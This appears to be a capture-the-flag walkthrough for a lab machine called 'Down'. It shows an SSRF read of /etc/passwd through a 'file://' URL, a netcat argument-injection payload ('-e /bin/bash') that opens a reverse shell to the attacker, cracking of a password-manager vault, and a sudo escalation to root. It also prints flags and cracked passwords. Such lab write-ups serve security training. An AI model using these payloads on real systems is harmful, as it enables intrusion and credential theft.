# Down

## Nmap Scan

~~~bash
sudo nmap 10.129.234.87 -n -Pn -A -p- -sCVS --min-rate 10000 --disable-arp-ping -vv
~~~

~~~text
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 f6:cc:21:7c:ca:da:ed:34:fd:04:ef:e6:f9:4c:dd:f8 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBL9eTcP2DDxJHJ2uCdOmMRIPaoOhvMFXL33f1pZTIe0VTdeHRNYlpm2a2PumsO5t88M7QF3L3d6n1eRHTTAskGw=
|   256 fa:06:1f:f4:bf:8c:e3:b0:c8:40:21:0d:57:06:dd:11 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJwLt0rmihlvq9pk6BmFhjTycNR54yApKIrnwI8xzYx/
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.52 ((Ubuntu))
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Is it down or just me?
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS

Device type: general purpose|router
Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 4.15 - 5.19, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)

TCP/IP fingerprint:
OS:SCAN(V=7.95%E=4%D=11/6%OT=22%CT=1%CU=37629%PV=Y%DS=2%DC=T%G=Y%TM=6AEDD3C
OS:B%P=x86_64-pc-linux-gnu)SEQ(SP=104%GCD=1%ISR=10A%TI=Z%CI=Z%II=I%TS=A)OPS
OS:(O1=M552ST11NW7%O2=M552ST11NW7%O3=M552NNT11NW7%O4=M552ST11NW7%O5=M552ST1
OS:1NW7%O6=M552ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN
OS:(R=Y%DF=Y%T=40%W=FAF0%O=M552NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A
OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R
OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F
OS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%
OS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD
OS:=S)

Uptime guess: 38.723 days (since Mon Sep 28 15:58:25 2026)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=260 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 143/tcp)
HOP RTT      ADDRESS
1   89.22 ms 10.10.14.1
2   89.51 ms 10.129.234.87
~~~

## Adding an `/etc/hosts` Entry

~~~bash
echo 10.129.234.87 down.htb | sudo tee -a /etc/hosts
~~~

## Burp Repeater

### Request for `/etc/passwd`

~~~text
REQUEST: http:// file://etc/passwd
~~~

~~~http
POST /index.php HTTP/1.1
Host: down.htb
Content-Length: 46
Cache-Control: max-age=0
Accept-Language: en-US,en;q=0.9
Origin: http://down.htb
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://down.htb/index.php
Accept-Encoding: gzip, deflate, br
Connection: keep-alive

url=http%3A%2F%2F+file%3A%2F%2F%2Fetc%2Fpasswd
~~~

**Response**

~~~text
<pre>
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...
aleks:x:1000:1000:Aleks:/home/aleks:/bin/bash
...
~~~

### Other Requests

~~~text
REQUEST: http:// file://var/www/html/index.php
REQUEST: ... ?expertmode=tcp ....
~~~

## TCP Expert Mode

~~~bash
nc -lvnp 1337
~~~

~~~text
Listening on 0.0.0.0 1337
~~~

~~~http
POST /index.php?expertmode=tcp HTTP/1.1
Host: down.htb
Content-Length: 22
Cache-Control: max-age=0
Accept-Language: en-US,en;q=0.9
Origin: http://down.htb
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://down.htb/index.php?expertmode=tcp
Accept-Encoding: gzip, deflate, br
Connection: keep-alive

ip=10.10.14.227&port=1337+-e+/bin/bash
~~~

## `www-data` Session

~~~text
Listening on 0.0.0.0 1337
Connection received on 10.129.234.87 43596
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
~~~

~~~bash
cat user_aeT1xa.txt
~~~

~~~text
d4bc94b386ef7c8113698a8c4951cacd
~~~

## PSWM

~~~bash
cat /home/aleks/.local/share/pswm/pswm
~~~

~~~text
e9laWoKiJ0OdwK05b3hG7xMD+uIBBwl/v01lBRD+pntORa6Z/Xu/TdN3aG/ksAA0Sz55/kLggw==*xHnWpIqBWc25rrHFGPzyTg==*4Nt/05WUbySGyvDgSlpoUw==*u65Jfe0ml9BFaKEviDCHBQ==
~~~

~~~bash
git clone https://github.com/seriotonctf/pswm-decryptor.git
cd pswm-decryptor
python3 -m venv env
source env/bin/activate
pip install --upgrade cryptocode prettytable
~~~

~~~bash
echo "e9laWoKiJ0OdwK05b3hG7xMD+uIBBwl/v01lBRD+pntORa6Z/Xu/TdN3aG/ksAA0Sz55/kLggw==*xHnWpIqBWc25rrHFGPzyTg==*4Nt/05WUbySGyvDgSlpoUw==*u65Jfe0ml9BFaKEviDCHBQ==" > pswm
~~~

~~~bash
python pswm-decrypt.py -f pswm -w /usr/share/wordlist/rockyou.txt
~~~

~~~text
[+] Master Password: flower
[+] Decrypted Data:
+------------+----------+----------------------+
| Alias      | Username | Password             |
+------------+----------+----------------------+
| pswm       | aleks    | flower               |
| aleks@down | aleks    | 1uY3w22uc-Wr{xNHR~+E |
+------------+----------+----------------------+
~~~

## SSH and `sudo`

### Logging In as `aleks`

~~~bash
ssh aleks@down.htb
~~~

~~~text
The authenticity of host 'down.htb (10.129.234.87)' can't be established.
ED25519 key fingerprint is SHA256:uq3+WwrPajXEUJC3CCuYMMlFTVM8CGYqMtGB9mI29wg.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'down.htb' (ED25519) to the list of known hosts.
(aleks@down.htb) Password:

Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-138-generic x86_64)

 System information as of Mon Nov  9 10:38:39 AM UTC 2026

  System load:           0.08
  Usage of /:            53.2% of 6.92GB
  Memory usage:          8%
  Swap usage:            0%
  Processes:             235
  Users logged in:       0
  IPv4 address for eth0: 10.129.234.87
  IPv6 address for eth0: dead:beef::a0de:adff:fef5:3bf2

Last login: Tue Jun 10 15:47:07 2025 from 10.10.14.67
~~~

### Checking `sudo` Permissions

~~~text
aleks@down:~$ sudo -l
[sudo] password for aleks:

Matching Defaults entries for aleks on down:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User aleks may run the following commands on down:
    (ALL : ALL) ALL
~~~

### Root Session

~~~bash
sudo su -
~~~

~~~text
root@down:~# cat /root/root.txt
87bb9869a311b8abb5fb4d3c7248fdcb
~~~
